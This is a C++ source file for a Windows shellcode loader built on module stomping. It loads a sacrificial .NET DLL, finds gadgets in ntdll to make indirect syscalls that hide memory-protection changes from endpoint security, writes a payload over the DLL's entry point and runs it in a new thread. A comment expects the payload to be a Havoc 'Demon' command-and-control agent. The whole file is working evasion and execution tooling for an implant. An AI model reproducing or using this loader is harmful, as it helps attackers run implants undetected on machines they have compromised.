#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include "../common.h"

#ifndef STOMP_DLL_PATH
#define STOMP_DLL_PATH L"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\mscordacwks.dll"
#endif

#ifndef STATUS_SUCCESS
#define STATUS_SUCCESS ((NTSTATUS)0x00000000)
#endif

struct SpoofContext {
    PVOID Gadget;
    PVOID SyscallGadget;
    BOOL  Ready;
};

extern "C" NTSTATUS NtProtectVirtualMemory_Indirect(
    HANDLE ProcessHandle, PVOID* BaseAddress, PSIZE_T RegionSize,
    ULONG NewProtect, PULONG OldProtect, PVOID SyscallGadget);

static BOOL InitSpoofContext(SpoofContext* ctx) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return FALSE;

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hNtdll;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)hNtdll + dos->e_lfanew);
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);

    PBYTE base = NULL;
    DWORD size = 0;
    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (strcmp((char*)sec[i].Name, ".text") == 0) {
            base = (PBYTE)hNtdll + sec[i].VirtualAddress;
            size = sec[i].Misc.VirtualSize;
            break;
        }
    }
    if (!base) return FALSE;

    ctx->Gadget = NULL;
    ctx->SyscallGadget = NULL;
    ctx->Ready = FALSE;

    for (PBYTE cur = base; cur <= base + size - 3; cur++) {
        if (!ctx->Gadget && cur[0] == 0x41 && cur[1] == 0xFF && cur[2] == 0xD4) {
            ctx->Gadget = cur;
        }
        if (!ctx->SyscallGadget && cur[0] == 0x0F && cur[1] == 0x05 && cur[2] == 0xC3) {
            ctx->SyscallGadget = cur;
        }
        if (ctx->Gadget && ctx->SyscallGadget) break;
    }

    if (ctx->Gadget && ctx->SyscallGadget) ctx->Ready = TRUE;
    return ctx->Ready;
}

static BOOL ChangeProtection(SpoofContext* ctx, PVOID addr, SIZE_T size,
                              ULONG newProt, PULONG oldProt) {
    if (ctx->Ready) {
        PVOID baseAddr = addr;
        SIZE_T regionSize = size;
        NTSTATUS status = NtProtectVirtualMemory_Indirect(
            GetCurrentProcess(), &baseAddr, &regionSize,
            newProt, oldProt, ctx->SyscallGadget);

        if (status == STATUS_SUCCESS) {
            printf("[+] Indirect syscall succeeded (status: 0x%lx)\n", (ULONG)status);
            return TRUE;
        }
        printf("[-] Indirect syscall FAILED (status: 0x%lx), falling back to VirtualProtect\n",
               (ULONG)status);
    }

    if (!VirtualProtect(addr, size, newProt, (PDWORD)oldProt)) {
        printf("[-] VirtualProtect also failed (error: %lu)\n", GetLastError());
        return FALSE;
    }
    printf("[+] VirtualProtect fallback succeeded\n");
    return TRUE;
}

LONG WINAPI CrashHandler(EXCEPTION_POINTERS* ep) {
    printf("[!!!] EXCEPTION in shellcode!\n");
    printf("[!!!] Code: 0x%lx at address: %p\n",
           ep->ExceptionRecord->ExceptionCode,
           ep->ExceptionRecord->ExceptionAddress);
    printf("[!!!] RIP: 0x%llx\n", (unsigned long long)ep->ContextRecord->Rip);
    printf("[!!!] RSP: 0x%llx\n", (unsigned long long)ep->ContextRecord->Rsp);
    printf("[!!!] RAX: 0x%llx\n", (unsigned long long)ep->ContextRecord->Rax);
    printf("[!!!] RCX: 0x%llx\n", (unsigned long long)ep->ContextRecord->Rcx);
    printf("[!!!] RDX: 0x%llx\n", (unsigned long long)ep->ContextRecord->Rdx);
    fflush(stdout);
    return EXCEPTION_CONTINUE_SEARCH;
}

int main(int argc, char* argv[]) {
    AddVectoredExceptionHandler(1, CrashHandler);

    SpoofContext ctx = {0};

    if (!InitSpoofContext(&ctx)) {
        PrintError("Failed to find gadgets in ntdll");
        return 1;
    }
    printf("[+] Gadget (call r12) : %p\n", ctx.Gadget);
    printf("[+] SyscallGadget     : %p\n", ctx.SyscallGadget);

    BYTE* payload = NULL;
    DWORD payloadSize = 0;
    if (!LoadPayload(&payload, &payloadSize)) return 1;

    // Save first 16 bytes for verification later
    BYTE savedHeader[16];
    memcpy(savedHeader, payload, 16);

    PrintStep(2, "Loading sacrificial DLL");
    HMODULE hModule = LoadLibraryW(STOMP_DLL_PATH);
    if (!hModule) {
        PrintError("LoadLibrary failed");
        free(payload);
        return 1;
    }
    DisableThreadLibraryCalls(hModule);
    printf("[+] Loaded DLL at: 0x%p\n", hModule);

    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hModule;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hModule + dosHeader->e_lfanew);
    PIMAGE_SECTION_HEADER sectionHeader = IMAGE_FIRST_SECTION(ntHeaders);

    DWORD entryPointRVA = ntHeaders->OptionalHeader.AddressOfEntryPoint;
    LPVOID entryPoint = (LPVOID)((BYTE*)hModule + entryPointRVA);
    printf("[+] Entry Point: 0x%p (RVA: 0x%lx)\n", entryPoint, entryPointRVA);

    LPVOID textBase = NULL;
    DWORD textSize = 0;
    DWORD textVA = 0;
    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
        if (strcmp((char*)sectionHeader[i].Name, ".text") == 0) {
            textVA = sectionHeader[i].VirtualAddress;
            textBase = (LPVOID)((BYTE*)hModule + textVA);
            textSize = sectionHeader[i].Misc.VirtualSize;
        }
    }

    if (!textBase) {
        PrintError("No .text section found");
        free(payload);
        return 1;
    }

    DWORD availableFromEP = textSize;
    if (entryPointRVA >= textVA && entryPointRVA < textVA + textSize) {
        availableFromEP = textSize - (entryPointRVA - textVA);
        printf("[+] EP inside .text — available: %lu bytes\n", availableFromEP);
    } else {
        printf("[!] EP outside .text, using .text base\n");
        entryPoint = textBase;
        availableFromEP = textSize;
    }

    if (payloadSize > availableFromEP) {
        printf("[-] Payload too large\n");
        free(payload);
        return 1;
    }
    printf("[+] Payload: %lu bytes (fits in %lu)\n", payloadSize, availableFromEP);

    MEMORY_BASIC_INFORMATION mbi;
    VirtualQuery(entryPoint, &mbi, sizeof(mbi));
    printf("[i] Protection before: 0x%lx  Type: 0x%lx  State: 0x%lx\n",
           mbi.Protect, mbi.Type, mbi.State);

    PrintStep(3, "Stomping module memory");
    ULONG oldProtect = 0;
    if (!ChangeProtection(&ctx, entryPoint, payloadSize, PAGE_READWRITE, &oldProtect)) {
        PrintError("Cannot change to RW");
        free(payload);
        return 1;
    }

    memcpy(entryPoint, payload, payloadSize);
    free(payload);

    // Verify ALL bytes match, not just first 4
    BOOL integrity = (memcmp(entryPoint, savedHeader, 16) == 0);
    printf("[+] Payload written. First 16: ");
    for (int i = 0; i < 16; i++) printf("%02X ", ((BYTE*)entryPoint)[i]);
    printf("\n[+] Integrity check: %s\n", integrity ? "PASS" : "FAIL");

    ULONG tmpProtect = 0;
    ChangeProtection(&ctx, entryPoint, payloadSize,
                     oldProtect ? oldProtect : PAGE_EXECUTE_READ, &tmpProtect);

    VirtualQuery(entryPoint, &mbi, sizeof(mbi));
    printf("[i] Protection after: 0x%lx  Type: 0x%lx  State: 0x%lx\n",
           mbi.Protect, mbi.Type, mbi.State);

    // Re-verify bytes after protection change (check COW didn't revert)
    BOOL postIntegrity = (memcmp(entryPoint, savedHeader, 16) == 0);
    printf("[+] Post-restore integrity: %s\n", postIntegrity ? "PASS" : "FAIL");
    if (!postIntegrity) {
        printf("[!!!] BYTES CHANGED after VirtualProtect! COW reverted?\n");
        printf("[!!!] Got: ");
        for (int i = 0; i < 16; i++) printf("%02X ", ((BYTE*)entryPoint)[i]);
        printf("\n");
    }

    PrintStep(4, "Executing payload");
    printf("[+] Start address: %p\n", entryPoint);
    fflush(stdout);

    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)entryPoint, NULL, 0, NULL);
    if (!hThread) {
        PrintError("CreateThread failed");
        return 1;
    }
    printf("[+] Thread created (ID: %lu)\n", GetThreadId(hThread));
    printf("[+] Waiting for thread...\n");
    fflush(stdout);

    DWORD waitResult = WaitForSingleObject(hThread, 10000);
    if (waitResult == WAIT_TIMEOUT) {
        printf("[+] Thread still running after 10s (expected for Demon agent)\n");
        WaitForSingleObject(hThread, INFINITE);
    } else {
        DWORD exitCode = 0;
        GetExitCodeThread(hThread, &exitCode);
        printf("[!] Thread EXITED after %lu ms (exit code: 0x%lx)\n",
               waitResult, exitCode);
        printf("[!] This means shellcode returned or crashed\n");
    }

    CloseHandle(hThread);
    return 0;
}
